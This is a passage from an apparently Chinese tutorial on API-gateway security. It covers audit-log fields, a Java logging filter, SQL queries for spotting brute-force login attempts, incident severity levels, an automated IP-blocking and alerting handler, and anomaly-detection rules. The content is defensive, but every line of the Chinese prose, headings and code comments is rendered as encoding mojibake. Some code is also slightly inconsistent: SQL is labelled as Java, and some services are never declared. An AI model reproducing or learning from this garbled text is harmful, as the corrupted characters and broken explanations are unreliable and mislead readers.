### 6.1 å®¡è®¡æ—¥å¿—è®°å½•ä»€ä¹ˆ


**å¿…é¡»è®°å½•çš„å®‰å…¨äº‹ä»¶**

| äº‹ä»¶ç±»å‹ | è®°å½•å†…å®¹ | ç”¨é€” |
|---------|---------|------|
| **ç™»å½•äº‹ä»¶** | ç”¨æˆ·IDã€IPåœ°å€ã€æ—¶é—´ã€ç»“æœ | è¿½è¸ªå¼‚å¸¸ç™»å½• |
| **æƒé™å˜æ›´** | æ“ä½œäººã€è¢«æ“ä½œäººã€å˜æ›´å†…å®¹ | æƒé™å®¡è®¡ |
| **æ•æ„Ÿæ“ä½œ** | åˆ é™¤æ•°æ®ã€ä¿®æ”¹é…ç½®ç­‰ | äº‹æ•…è¿½æº¯ |
| **å¼‚å¸¸è®¿é—®** | 403/401é”™è¯¯ã€SQLæ³¨å…¥å°è¯• | å®‰å…¨ç›‘æ§ |
| **æ•°æ®è®¿é—®** | è°æŸ¥çœ‹äº†å“ªäº›æ•æ„Ÿæ•°æ® | åˆè§„è¦æ±‚ |

**å®¡è®¡æ—¥å¿—æ ¼å¼ç¤ºä¾‹**

```json
{
  "eventId": "audit-20250923-001",
  "eventType": "LOGIN_SUCCESS",
  "userId": "user123",
  "userName": "å¼ ä¸‰",
  "ipAddress": "192.168.1.100",
  "timestamp": "2025-09-23T14:30:00Z",
  "resource": "/api/login",
  "method": "POST",
  "userAgent": "Mozilla/5.0...",
  "result": "SUCCESS",
  "details": {
    "loginMethod": "PASSWORD",
    "location": "åŒ—äº¬å¸‚æœé˜³åŒº"
  }
}
```

### 6.2 å®¡è®¡æ—¥å¿—å®ç°


**æ—¥å¿—è®°å½•è¿‡æ»¤å™¨**

```java
@Component
@Slf4j
public class AuditLogFilter implements GlobalFilter {
    
    @Autowired
    private AuditLogService auditLogService;
    
    @Override
    public Mono<Void> filter(ServerWebExchange exchange, GatewayFilterChain chain) {
        ServerHttpRequest request = exchange.getRequest();
        
        // è®°å½•è¯·æ±‚å¼€å§‹æ—¶é—´
        long startTime = System.currentTimeMillis();
        
        return chain.filter(exchange).doFinally(signalType -> {
            // è¯·æ±‚ç»“æŸï¼Œè®°å½•å®¡è®¡æ—¥å¿—
            long duration = System.currentTimeMillis() - startTime;
            
            AuditLog auditLog = AuditLog.builder()
                .userId(getUserId(request))
                .ipAddress(getClientIp(request))
                .method(request.getMethodValue())
                .uri(request.getURI().toString())
                .statusCode(exchange.getResponse().getStatusCode().value())
                .duration(duration)
                .timestamp(LocalDateTime.now())
                .build();
            
            // å¼‚æ­¥è®°å½•æ—¥å¿—ï¼Œä¸å½±å“å“åº”é€Ÿåº¦
            auditLogService.saveAsync(auditLog);
            
            // å¦‚æœæ˜¯æ•æ„Ÿæ“ä½œæˆ–å¼‚å¸¸è®¿é—®ï¼Œé¢å¤–è®°å½•è¯¦ç»†ä¿¡æ¯
            if (isSensitiveOperation(request) || isAbnormalAccess(exchange)) {
                recordDetailedLog(auditLog, request, exchange);
            }
        });
    }
    
    private boolean isSensitiveOperation(ServerHttpRequest request) {
        String path = request.getURI().getPath();
        // åˆ é™¤ã€ä¿®æ”¹é…ç½®ç­‰æ“ä½œè§†ä¸ºæ•æ„Ÿ
        return request.getMethod() == HttpMethod.DELETE || 
               path.contains("/config") ||
               path.contains("/permission");
    }
    
    private boolean isAbnormalAccess(ServerWebExchange exchange) {
        HttpStatus status = exchange.getResponse().getStatusCode();
        // 403ã€401ã€500ç­‰çŠ¶æ€ç è§†ä¸ºå¼‚å¸¸
        return status == HttpStatus.FORBIDDEN ||
               status == HttpStatus.UNAUTHORIZED ||
               status.is5xxServerError();
    }
}
```

**ğŸ“Š æ—¥å¿—åˆ†æç¤ºä¾‹**

```java
// ç»Ÿè®¡å¼‚å¸¸ç™»å½•
SELECT userId, COUNT(*) as failCount
FROM audit_log
WHERE eventType = 'LOGIN_FAILED'
  AND timestamp > NOW() - INTERVAL 1 HOUR
GROUP BY userId
HAVING failCount > 5;  -- 1å°æ—¶å†…å¤±è´¥è¶…è¿‡5æ¬¡ï¼Œå¯èƒ½æ˜¯æš´åŠ›ç ´è§£

// ç»Ÿè®¡æ•æ„Ÿæ•°æ®è®¿é—®
SELECT userId, COUNT(*) as accessCount
FROM audit_log
WHERE resource LIKE '%/users/%'
  AND method = 'GET'
  AND timestamp > NOW() - INTERVAL 1 DAY
GROUP BY userId
ORDER BY accessCount DESC;  -- é¢‘ç¹è®¿é—®ç”¨æˆ·æ•°æ®ï¼Œå¯èƒ½æ˜¯å¼‚å¸¸è¡Œä¸º
```

---

## 7. ğŸš¨ å®‰å…¨äº‹ä»¶å“åº”


### 7.1 å®‰å…¨äº‹ä»¶åˆ†çº§


**äº‹ä»¶ä¸¥é‡ç¨‹åº¦åˆ†çº§**

| çº§åˆ« | æè¿° | å“åº”æ—¶é—´ | å¤„ç†æ–¹å¼ |
|-----|------|---------|---------|
| ğŸ”´ **P0-ç´§æ€¥** | ç³»ç»Ÿè¢«æ”»ç ´ã€æ•°æ®æ³„éœ² | ç«‹å³å“åº” | è‡ªåŠ¨é˜»æ–­+äººå·¥å¤„ç† |
| ğŸŸ  **P1-ä¸¥é‡** | DDoSæ”»å‡»ã€å¤§é‡å¼‚å¸¸è®¿é—® | 15åˆ†é’Ÿå†… | è‡ªåŠ¨é™æµ+å‘Šè­¦ |
| ğŸŸ¡ **P2-é‡è¦** | å¤šæ¬¡ç™»å½•å¤±è´¥ã€æƒé™å¼‚å¸¸ | 1å°æ—¶å†… | ç›‘æ§è§‚å¯Ÿ+è®°å½• |
| ğŸŸ¢ **P3-ä¸€èˆ¬** | å•æ¬¡å¼‚å¸¸è¯·æ±‚ | 24å°æ—¶å†… | è®°å½•æ—¥å¿— |

### 7.2 è‡ªåŠ¨åŒ–å“åº”æœºåˆ¶


**å“åº”æµç¨‹**

```
æ£€æµ‹åˆ°å¼‚å¸¸
    â†“
è‡ªåŠ¨åˆ†çº§è¯„ä¼°
    â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  P0ç´§æ€¥  â”‚  P1ä¸¥é‡  â”‚  P2é‡è¦  â”‚
â”‚   â†“      â”‚   â†“      â”‚   â†“      â”‚
â”‚è‡ªåŠ¨é˜»æ–­  â”‚è‡ªåŠ¨é™æµ  â”‚ç›‘æ§è®°å½•  â”‚
â”‚äººå·¥ä»‹å…¥  â”‚å‘é€å‘Šè­¦  â”‚å»¶è¿Ÿå¤„ç†  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**è‡ªåŠ¨å“åº”å®ç°**

```java
@Component
public class SecurityEventHandler {
    
    @Autowired
    private AlertService alertService;
    
    @Autowired
    private IpBlockService ipBlockService;
    
    // å¤„ç†å®‰å…¨äº‹ä»¶
    public void handleSecurityEvent(SecurityEvent event) {
        switch (event.getLevel()) {
            case P0_CRITICAL:
                handleCriticalEvent(event);
                break;
            case P1_HIGH:
                handleHighEvent(event);
                break;
            case P2_MEDIUM:
                handleMediumEvent(event);
                break;
            default:
                logEvent(event);
        }
    }
    
    // P0çº§åˆ«ï¼šç«‹å³é˜»æ–­
    private void handleCriticalEvent(SecurityEvent event) {
        // 1. è‡ªåŠ¨å°ç¦IP
        ipBlockService.blockIp(event.getIpAddress(), Duration.ofHours(24));
        
        // 2. å‘é€ç´§æ€¥å‘Šè­¦ï¼ˆç”µè¯ã€çŸ­ä¿¡ï¼‰
        alertService.sendUrgentAlert(
            "ç´§æ€¥å®‰å…¨äº‹ä»¶",
            event.getDescription(),
            AlertChannel.SMS, AlertChannel.PHONE
        );
        
        // 3. è®°å½•è¯¦ç»†æ—¥å¿—
        logDetailedEvent(event);
        
        // 4. è§¦å‘å®‰å…¨é¢„æ¡ˆ
        triggerSecurityPlan(event.getType());
    }
    
    // P1çº§åˆ«ï¼šé™æµ+å‘Šè­¦
    private void handleHighEvent(SecurityEvent event) {
        // 1. å¯åŠ¨ä¸´æ—¶é™æµ
        rateLimitService.enableStrictMode(event.getIpAddress());
        
        // 2. å‘é€å‘Šè­¦é€šçŸ¥
        alertService.sendAlert(
            "é«˜å±å®‰å…¨äº‹ä»¶",
            event.getDescription(),
            AlertChannel.EMAIL, AlertChannel.SLACK
        );
        
        // 3. è®°å½•æ—¥å¿—
        logEvent(event);
    }
    
    // P2çº§åˆ«ï¼šç›‘æ§è§‚å¯Ÿ
    private void handleMediumEvent(SecurityEvent event) {
        // 1. åŠ å¼ºç›‘æ§
        monitorService.addWatch(event.getUserId(), Duration.ofHours(1));
        
        // 2. å‘é€é€šçŸ¥
        alertService.sendNotification(event.getDescription());
        
        // 3. è®°å½•æ—¥å¿—
        logEvent(event);
    }
}
```

### 7.3 å¼‚å¸¸æ£€æµ‹è§„åˆ™


**å¸¸è§å¼‚å¸¸æ¨¡å¼**

```java
@Component
public class AnomalyDetector {
    
    // è§„åˆ™1ï¼šæš´åŠ›ç ´è§£æ£€æµ‹
    public boolean detectBruteForce(String userId) {
        // 5åˆ†é’Ÿå†…ç™»å½•å¤±è´¥è¶…è¿‡10æ¬¡
        long failCount = auditLogRepository.countFailedLogins(
            userId, 
            LocalDateTime.now().minusMinutes(5)
        );
        return failCount > 10;
    }
    
    // è§„åˆ™2ï¼šå¼‚å¸¸è®¿é—®é‡æ£€æµ‹
    public boolean detectAbnormalTraffic(String ipAddress) {
        // 1åˆ†é’Ÿå†…è¯·æ±‚è¶…è¿‡1000æ¬¡
        long requestCount = requestLogRepository.countRequests(
            ipAddress,
            LocalDateTime.now().minusMinutes(1)
        );
        return requestCount > 1000;
    }
    
    // è§„åˆ™3ï¼šå¼‚å¸¸æ—¶é—´è®¿é—®æ£€æµ‹
    public boolean detectOffHourAccess(String userId, LocalDateTime accessTime) {
        // å‡Œæ™¨2ç‚¹-6ç‚¹è®¿é—®æ•æ„Ÿèµ„æº
        int hour = accessTime.getHour();
        boolean isOffHour = hour >= 2 && hour <= 6;
        boolean isSensitiveResource = isSensitiveUser(userId);
        return isOffHour && isSensitiveResource;
    }
    
    // è§„åˆ™4ï¼šå¼‚å¸¸åœ°ç†ä½ç½®æ£€æµ‹
    public boolean detectAbnormalLocation(String userId, String ipAddress) {
        // ç”¨æˆ·åœ¨1å°æ—¶å†…ä»ä¸åŒåŸå¸‚ç™»å½•
        List<String> recentLocations = loginHistoryRepository
            .findRecentLocations(userId, Duration.ofHours(1));
        
        String currentLocation = geoService.getLocation(ipAddress);
        
        return recentLocations.stream()
            .anyMatch(location -> !location.equals(currentLocation));
    }
}
```

**ğŸ” æ£€æµ‹è§¦å‘æµç¨‹**

```
æ¯æ¬¡è¯·æ±‚
    â†“
è¿è¡Œæ£€æµ‹è§„åˆ™
    â†“
å‘ç°å¼‚å¸¸ï¼Ÿ
  /     \
å¦       æ˜¯
â†“        â†“
æ­£å¸¸å¤„ç†  ç”Ÿæˆå®‰å…¨äº‹ä»¶
         â†“
      äº‹ä»¶åˆ†çº§
         â†“
      è‡ªåŠ¨å“åº”
         â†“
      äººå·¥å®¡æ ¸
```

---

## 8. ğŸ“‹ æ ¸å¿ƒè¦ç‚¹æ€»ç»“


### 8.1 å®‰å…¨é˜²æŠ¤ä¸‰é“é˜²çº¿


```
ğŸ”¸ ç¬¬ä¸€é“é˜²çº¿ï¼šç½‘ç»œå®‰å…¨
   â€¢ DDoSé˜²æŠ¤ï¼šæµé‡æ¸…æ´—ã€é™æµç†”æ–­
   â€¢ IPç®¡ç†ï¼šé»‘ç™½åå•ã€åŒºåŸŸé™åˆ¶
   
ğŸ”¸ ç¬¬äºŒé“é˜²çº¿ï¼šåº”ç”¨å®‰å…¨  
   â€¢ èº«ä»½è®¤è¯ï¼šJWTã€OAuth 2.0
   â€¢ é˜²æ³¨å…¥ï¼šSQLæ³¨å…¥ã€XSSæ”»å‡»é˜²æŠ¤
   â€¢ æƒé™æ§åˆ¶ï¼šRBACè§’è‰²æƒé™æ¨¡å‹
   
ğŸ”¸ ç¬¬ä¸‰é“é˜²çº¿ï¼šæ•°æ®å®‰å…¨
   â€¢ ä¼ è¾“åŠ å¯†ï¼šHTTPS/TLS
   â€¢ æ•°æ®è„±æ•ï¼šæ•æ„Ÿä¿¡æ¯éšè—
   â€¢ å®¡è®¡æ—¥å¿—ï¼šå®Œæ•´æ“ä½œè®°å½•
```

### 8.2 å…³é”®ç†è§£è¦ç‚¹


**ğŸ¯ å®‰å…¨é˜²æŠ¤çš„æœ¬è´¨**
- ä¸æ˜¯é˜²æ­¢æ‰€æœ‰æ”»å‡»ï¼Œè€Œæ˜¯**æé«˜æ”»å‡»æˆæœ¬**
- **çºµæ·±é˜²å¾¡**ï¼šå¤šå±‚é˜²æŠ¤ï¼Œä¸€å±‚å¤±æ•ˆå…¶ä»–å±‚ç»§ç»­ä¿æŠ¤
- **æŒç»­ç›‘æ§**ï¼šåŠæ—¶å‘ç°å¼‚å¸¸ï¼Œå¿«é€Ÿå“åº”

**âš–ï¸ å®‰å…¨ä¸æ€§èƒ½çš„å¹³è¡¡**

| å®‰å…¨æªæ–½ | æ€§èƒ½å½±å“ | å»ºè®® |
|---------|---------|-----|
| HTTPSåŠ å¯† | è½»å¾®å»¶è¿Ÿ | âœ… å¿…é¡»ä½¿ç”¨ |
| JWTéªŒè¯ | å‡ ä¹æ— å½±å“ | âœ… æ¨è |
| æ•°æ®è„±æ• | ä¸­ç­‰å½±å“ | âœ… å¿…è¦æ—¶ä½¿ç”¨ |
| è¯·æ±‚æ—¥å¿— | è¾ƒå¤§å½±å“ | âš ï¸ å¼‚æ­¥è®°å½• |
| å®æ—¶ç›‘æ§ | è¾ƒå¤§å½±å“ | âš ï¸ é‡‡æ ·ç›‘æ§ |

**ğŸ’¡ æœ€ä½³å®è·µå»ºè®®**

âœ… **å¿…é¡»åšçš„**
- æ‰€æœ‰å¤–ç½‘æ¥å£ä½¿ç”¨HTTPS
- å®æ–½ä¸¥æ ¼çš„èº«ä»½è®¤è¯
- è®°å½•å…³é”®æ“ä½œå®¡è®¡æ—¥å¿—
- å®šæœŸæ›´æ–°å®‰å…¨è§„åˆ™

âš ï¸ **éœ€è¦æ³¨æ„çš„**
- ä¸è¦åœ¨æ—¥å¿—ä¸­è®°å½•æ•æ„Ÿä¿¡æ¯ï¼ˆå¯†ç ã€å¯†é’¥ç­‰ï¼‰
- Tokenè¦è®¾ç½®åˆç†çš„è¿‡æœŸæ—¶é—´
- é™æµé˜ˆå€¼è¦æ ¹æ®å®é™…ä¸šåŠ¡è°ƒæ•´
- å®šæœŸå®¡æŸ¥å’Œæ›´æ–°é»‘åå•

âŒ **ä¸è¦åšçš„**
- ä¸è¦æ˜æ–‡ä¼ è¾“å¯†ç 
- ä¸è¦åœ¨å®¢æˆ·ç«¯å­˜å‚¨æ•æ„Ÿä¿¡æ¯
- ä¸è¦ä½¿ç”¨å¼±åŠ å¯†ç®—æ³•ï¼ˆå¦‚MD5ï¼‰
- ä¸è¦å¿½ç•¥å®‰å…¨å‘Šè­¦

### 8.3 åº”æ€¥å“åº”æ£€æŸ¥æ¸…å•


**ğŸš¨ å‘ç°å®‰å…¨äº‹ä»¶åçš„å¤„ç†æ­¥éª¤**

```
âœ… 1. ç«‹å³è¯„ä¼°å½±å“èŒƒå›´
   - æœ‰å¤šå°‘ç”¨æˆ·å—å½±å“ï¼Ÿ
   - æ•°æ®æ˜¯å¦æ³„éœ²ï¼Ÿ
   - ç³»ç»Ÿæ˜¯å¦ç˜«ç—ªï¼Ÿ

âœ… 2. ç´§æ€¥æ­¢æŸæªæ–½
   - é˜»æ–­æ”»å‡»æºIP
   - ä¸´æ—¶å…³é—­å—å½±å“æœåŠ¡
   - é€šçŸ¥å—å½±å“ç”¨æˆ·

âœ… 3. é—®é¢˜æ’æŸ¥åˆ†æ
   - æŸ¥çœ‹å®¡è®¡æ—¥å¿—
   - åˆ†ææ”»å‡»æ‰‹æ®µ
   - æ‰¾åˆ°å®‰å…¨æ¼æ´

âœ… 4. ä¿®å¤ä¸åŠ å›º
   - ä¿®å¤å®‰å…¨æ¼æ´
   - åŠ å¼ºé˜²æŠ¤æªæ–½
   - æ›´æ–°å®‰å…¨è§„åˆ™

âœ… 5. äº‹åæ€»ç»“
   - ç¼–å†™äº‹ä»¶æŠ¥å‘Š
   - ä¼˜åŒ–åº”æ€¥é¢„æ¡ˆ
   - å¼€å±•å®‰å…¨åŸ¹è®­
```

**ğŸ§  è®°å¿†å£è¯€**
> ç½‘ç»œæ‹¦æˆªåœ¨é—¨å¤–ï¼Œåº”ç”¨éªŒè¯åœ¨é—¨å†…
> 
> æ•°æ®åŠ å¯†é˜²æ³„éœ²ï¼Œå®¡è®¡æ—¥å¿—æŸ¥è¸ªè¿¹
> 
> åˆ†çº§å“åº”å¿«å¤„ç½®,æŒç»­ç›‘æ§ä¿å¹³å®‰

---

**ğŸ“š æ‰©å±•é˜…è¯»**
- OWASP Top 10 å®‰å…¨é£é™©
- OAuth 2.0 æˆæƒæ¡†æ¶è¯¦è§£
- å¾®æœåŠ¡å®‰å…¨æ¶æ„è®¾è®¡
- ç­‰ä¿2.0åˆè§„è¦æ±‚